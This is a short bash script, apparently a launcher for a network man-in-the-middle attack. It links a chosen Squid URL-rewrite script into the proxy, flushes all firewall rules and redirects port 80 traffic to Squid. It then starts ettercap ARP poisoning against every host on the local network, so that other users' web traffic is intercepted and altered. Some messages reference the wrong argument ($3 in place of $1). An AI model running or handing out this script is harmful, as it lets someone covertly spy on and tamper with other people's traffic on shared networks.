#!/bin/bash
SDIR=/opt/squid/sbin

function list_services {

	printf "%20s  %s\n" "Service Name" "Service Function"
	printf "%20s  %s\n" "------------" "----------------"
	for service in `ls $SDIR | grep -v not-working`; do
		desc=`grep DEF: $SDIR/$service | sed 's/.*DEF: //'`
		printf "%20s: %s\n" $service "$desc"
	done
	printf "\n"
}


if [ -z $1 ] ; then
	list_services
	echo "Usage: $0 service_name"
	echo
	exit
fi

if [ ! -f $SDIR/$1 ] ; then
	printf "\n!!! Invalid service name: %s\n\n" $3
	list_services
	exit
fi

# Cleanup temporary directory
echo -n , Removing old temporary files
rm /var/www/tmp/* 2>/dev/null # Don't warn about empty directory

# Link Squid service
echo -n , Configuring Squid Proxy for $3
rm /etc/squid3/url_rewrite_program
ln -s $SDIR/$1 /etc/squid3/url_rewrite_program
service squid3 restart >/dev/null

#echo -n , Setting firewall rules
iptables --flush
iptables --table nat --flush
iptables --delete-chain
#iptables --table nat --append POSTROUTING --out-interface $2 -j MASQUERADE
#iptables --append FORWARD --in-interface $1 -j ACCEPT
iptables --table nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128

#echo -n , Setting up routing
#sysctl -w net.ipv4.ip_forward=1 >/dev/null
ettercap -D -l /root/etter.infos -m /root/etter.msgs -M arp // //

